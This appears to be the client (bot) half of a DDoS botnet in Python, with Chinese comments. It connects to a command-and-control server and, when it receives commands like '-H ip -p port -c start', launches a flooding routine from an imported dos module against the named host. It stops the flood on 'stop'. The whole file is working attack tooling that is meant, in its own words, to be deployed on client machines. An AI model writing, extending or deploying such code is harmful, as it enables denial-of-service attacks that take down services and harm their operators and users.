import dos
import random
import socket
import sys
import os
from multiprocessing import Process
import argparse
from scapy.all import *

curProcess = None

# sock为一个套接字对象，parser为命令解析的规则

#**********************
#                     *
#本文件请部署在客户端上 *
#                     *
#**********************

def cmdHandle(sock: socket.socket, parser: argparse.ArgumentParser):
    global curProcess
    while True:
        data = sock.recv(1024).decode()  # 客户端从主机端接收数据并且解压
        if len(data) == 0:  # 检查从服务器端接收的数据的长度
            print("THIS DATA IS EMPTY!")
            return
        if data[0] != '#':  # 检查从服务器端接收的数据的合法性
            print("THIS DATA IS INVALID!")
            return
        else:
            try:
                # 对命令行的命令进行解析
                param = parser.parse_args(data[1:].split())
                host = param.host #从命令中解析出host，即ip地址
                port = param.port #从命令中解析出port
                cmd = param.cmd   #从命令中解析出控制命令
                if cmd.lower() == 'start':
                    if curProcess != None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print("ddos starts")
                    p = Process(target=dos.dos, args=(host, port))
                    p.start()
                    curProcess = p
                elif cmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print("INVALID COMMAND!")


def main():
    p = argparse.ArgumentParser()
    #创建命令规则
    #规则格式为 #-H XXX.XXX.XXX.XXX(需要攻击的ip地址) -p XXXX(需要攻击的端口) -c start[开启攻击，若关闭攻击则替换为stop]
    p.add_argument('-H', dest='host', type=str) #-h后的参数为host，定义为字符串类型
    p.add_argument('-p', dest='port', type=int) #-p后的参数为port，定义为整型类型
    p.add_argument('-c', dest='cmd', type=str) #-c后的参数为cmdControl，定义为字符串类型
    print('='*40)

    try:
        #创建一个无信息的套接字对象
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #此处的127.0.0.1需要连接的服务器的ip地址
        #此处的58868替换成需要连接的服务器的端口
        s.connect(('127.0.0.1',4300))
        print('client already connected')
        print('='*40)
    except Exception as e:
        print('client connected failed')
        print('please restart the programme')
        sys.exit(0)
    cmdHandle(s,p)
    
if __name__=='__main__':
    main()
    
